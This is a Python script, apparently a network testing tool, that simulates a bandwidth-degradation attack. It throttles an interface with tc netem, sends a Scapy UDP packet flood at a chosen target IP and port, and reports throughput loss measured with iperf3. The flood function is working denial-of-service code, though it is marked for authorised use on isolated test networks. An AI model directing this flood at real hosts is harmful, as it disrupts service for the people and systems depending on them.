#!/usr/bin/env python3
"""
Bandwidth Throttling Attack Simulation Agent — AUTHORIZED TESTING ONLY
Simulates bandwidth degradation attacks using Scapy and tc (traffic control)
to test QoS controls and network monitoring detection capabilities.

WARNING: Only use with explicit written authorization on isolated test networks.
"""

import json
import subprocess
import sys
import time
from datetime import datetime, timezone

from scapy.all import IP, TCP, UDP, Raw, send, RandShort


def run_cmd(cmd: list[str]) -> dict:
    """Execute shell command and return output."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {"success": result.returncode == 0, "stdout": result.stdout, "stderr": result.stderr}
    except Exception as e:
        return {"success": False, "stdout": "", "stderr": str(e)}


def setup_tc_throttle(interface: str, rate: str = "100kbit", latency: str = "200ms") -> dict:
    """Configure tc (traffic control) to throttle bandwidth on an interface."""
    clear = run_cmd(["tc", "qdisc", "del", "dev", interface, "root"])
    result = run_cmd([
        "tc", "qdisc", "add", "dev", interface, "root", "netem",
        "rate", rate, "delay", latency, "loss", "5%",
    ])
    return {
        "interface": interface,
        "rate_limit": rate,
        "added_latency": latency,
        "packet_loss": "5%",
        "applied": result["success"],
        "error": result["stderr"] if not result["success"] else "",
    }


def remove_tc_throttle(interface: str) -> dict:
    """Remove tc throttling rules from interface."""
    result = run_cmd(["tc", "qdisc", "del", "dev", interface, "root"])
    return {"removed": result["success"], "error": result["stderr"] if not result["success"] else ""}


def generate_bandwidth_flood(target_ip: str, target_port: int, packet_count: int = 100,
                              packet_size: int = 1400) -> dict:
    """Generate controlled bandwidth consumption traffic using Scapy."""
    payload = Raw(load=b"X" * packet_size)
    packets_sent = 0
    start = datetime.now(timezone.utc)

    for _ in range(packet_count):
        pkt = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / payload
        send(pkt, verbose=False)
        packets_sent += 1

    end = datetime.now(timezone.utc)
    duration = (end - start).total_seconds()
    total_bytes = packets_sent * (packet_size + 42)

    return {
        "target": f"{target_ip}:{target_port}",
        "packets_sent": packets_sent,
        "total_bytes": total_bytes,
        "total_mb": round(total_bytes / (1024 * 1024), 2),
        "duration_seconds": round(duration, 2),
        "rate_mbps": round((total_bytes * 8) / (duration * 1_000_000), 2) if duration > 0 else 0,
    }


def measure_baseline(target_ip: str, port: int = 5201) -> dict:
    """Measure baseline bandwidth using iperf3 client."""
    result = run_cmd(["iperf3", "-c", target_ip, "-p", str(port), "-t", "5", "-J"])
    if result["success"]:
        data = json.loads(result["stdout"])
        end = data.get("end", {}).get("sum_sent", {})
        return {
            "bandwidth_bps": end.get("bits_per_second", 0),
            "bandwidth_mbps": round(end.get("bits_per_second", 0) / 1_000_000, 2),
            "bytes_transferred": end.get("bytes", 0),
            "duration": end.get("seconds", 0),
        }
    return {"error": result["stderr"], "bandwidth_mbps": 0}


def generate_report(baseline: dict, throttle: dict, flood: dict, post_baseline: dict) -> str:
    """Generate bandwidth throttling simulation report."""
    lines = [
        "BANDWIDTH THROTTLING ATTACK SIMULATION REPORT — AUTHORIZED TESTING ONLY",
        "=" * 70,
        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        "",
        "BASELINE MEASUREMENT:",
        f"  Bandwidth: {baseline.get('bandwidth_mbps', 'N/A')} Mbps",
        "",
        "THROTTLE CONFIGURATION:",
        f"  Interface: {throttle.get('interface', 'N/A')}",
        f"  Rate Limit: {throttle.get('rate_limit', 'N/A')}",
        f"  Added Latency: {throttle.get('added_latency', 'N/A')}",
        f"  Applied: {throttle.get('applied', False)}",
        "",
        "FLOOD RESULTS:",
        f"  Target: {flood.get('target', 'N/A')}",
        f"  Data Sent: {flood.get('total_mb', 0)} MB",
        f"  Rate: {flood.get('rate_mbps', 0)} Mbps",
        "",
        "POST-ATTACK MEASUREMENT:",
        f"  Bandwidth: {post_baseline.get('bandwidth_mbps', 'N/A')} Mbps",
        "",
        "IMPACT ASSESSMENT:",
    ]

    if baseline.get("bandwidth_mbps") and post_baseline.get("bandwidth_mbps"):
        degradation = baseline["bandwidth_mbps"] - post_baseline["bandwidth_mbps"]
        pct = round(degradation / baseline["bandwidth_mbps"] * 100, 1) if baseline["bandwidth_mbps"] > 0 else 0
        lines.append(f"  Bandwidth Degradation: {degradation:.2f} Mbps ({pct}% reduction)")

    return "\n".join(lines)


if __name__ == "__main__":
    print("[!] BANDWIDTH THROTTLING SIMULATION — AUTHORIZED TESTING ONLY\n")

    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <interface> [packet_count]")
        sys.exit(1)

    target_ip = sys.argv[1]
    interface = sys.argv[2]
    pkt_count = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    print("[*] Measuring baseline bandwidth...")
    baseline = measure_baseline(target_ip)

    print("[*] Applying throttle rules...")
    throttle = setup_tc_throttle(interface)

    print(f"[*] Sending {pkt_count} flood packets...")
    flood = generate_bandwidth_flood(target_ip, 9999, packet_count=pkt_count)

    print("[*] Measuring post-attack bandwidth...")
    post_baseline = measure_baseline(target_ip)

    print("[*] Removing throttle rules...")
    remove_tc_throttle(interface)

    report = generate_report(baseline, throttle, flood, post_baseline)
    print(report)
